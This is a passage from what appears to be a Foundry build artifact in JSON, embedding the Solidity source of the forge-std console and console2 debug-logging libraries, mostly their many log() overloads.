_sendLogPayload(abi.encodeWithSignature(\"log(string,string,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, string memory p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,string,address,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, uint p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,uint,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, uint p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,uint,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, uint p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,uint,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, uint p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,uint,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, string memory p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,string,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, bool p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,bool,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, address p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,address,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, bool p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,bool,address,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, uint p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,uint,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, uint p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,uint,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, uint p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,uint,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, uint p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,uint,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, string memory p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,string,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, bool p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,bool,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, address p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,address,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(string memory p0, address p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(string,address,address,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint p1, uint p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint,uint,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint p1, uint p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint,uint,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint p1, uint p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint,uint,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint p1, uint p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint,uint,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint p1, string memory p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint,string,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint p1, bool p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint,bool,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint p1, address p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint,address,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, uint p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,uint,address,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, uint p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,uint,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, uint p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,uint,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, uint p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,uint,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, uint p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,uint,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, string memory p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,string,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, bool p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,bool,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, address p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,address,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, string memory p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,string,address,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, uint p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,uint,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, uint p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,uint,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, uint p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,uint,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, uint p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,uint,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, string memory p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,string,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, bool p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,bool,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, address p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,address,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, bool p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,bool,address,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, uint p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,uint,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, uint p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,uint,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, uint p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,uint,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, uint p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,uint,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, string memory p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,string,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, bool p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,bool,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, address p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,address,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(bool p0, address p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(bool,address,address,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint p1, uint p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint,uint,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint p1, uint p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint,uint,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint p1, uint p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint,uint,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint p1, uint p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint,uint,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint p1, string memory p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint,string,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint p1, bool p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint,bool,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint p1, address p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint,address,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, uint p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,uint,address,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, uint p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,uint,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, uint p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,uint,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, uint p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,uint,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, uint p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,uint,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, string memory p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,string,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, bool p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,bool,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, address p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,address,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, string memory p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,string,address,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, uint p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,uint,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, uint p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,uint,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, uint p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,uint,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, uint p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,uint,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, string memory p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,string,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, bool p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,bool,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, address p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,address,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,address,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, uint p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,uint,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, uint p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,uint,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, uint p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,uint,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, uint p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,uint,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, string memory p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,string,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, bool p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,bool,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, address p2, uint p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,address,uint)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,address,address)\", p0, p1, p2, p3));\n    }\n\n}","sourceMap":"66:66622:23:-:0;;;;;;;;;;;;;;;-1:-1:-1;;;66:66622:23;;;;;;;;;;;;;;;;;","sourceMapDeployed":"66:66622:23:-:0;;;;;;;;","constructor":null,"functions":[],"functionalLines":[]},{"name":"console2","artifactPath":"out/console2.sol/console2.json","sourcePath":"node_modules/@pwnednomore/contracts/lib/forge-std/src/console2.sol","contractId":"node_modules/@pwnednomore/contracts/lib/forge-std/src/console2.sol:console2","sourceFileId":24,"sourceContent":"// SPDX-License-Identifier: MIT\npragma solidity >=0.4.22 <0.9.0;\n\n// The orignal console.sol uses `int` and `uint` for computing function selectors, but it should\n// use `int256` and `uint256`. This modified version fixes that. This version is recommended\n// over `console.sol` if you don't need compatibility with Hardhat as the logs will show up in\n// forge stack traces. If you do need compatibility with Hardhat, you must use `console.sol`.\n// Reference: https://github.com/NomicFoundation/hardhat/issues/2178\n\nlibrary console2 {\n    address constant CONSOLE_ADDRESS = address(0x000000000000000000636F6e736F6c652e6c6f67);\n\n    function _sendLogPayload(bytes memory payload) private view {\n        uint256 payloadLength = payload.length;\n        address consoleAddress = CONSOLE_ADDRESS;\n        assembly {\n            let payloadStart := add(payload, 32)\n            let r := staticcall(gas(), consoleAddress, payloadStart, payloadLength, 0, 0)\n        }\n    }\n\n    function log() internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log()\"));\n    }\n\n    function logInt(int256 p0) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(int256)\", p0));\n    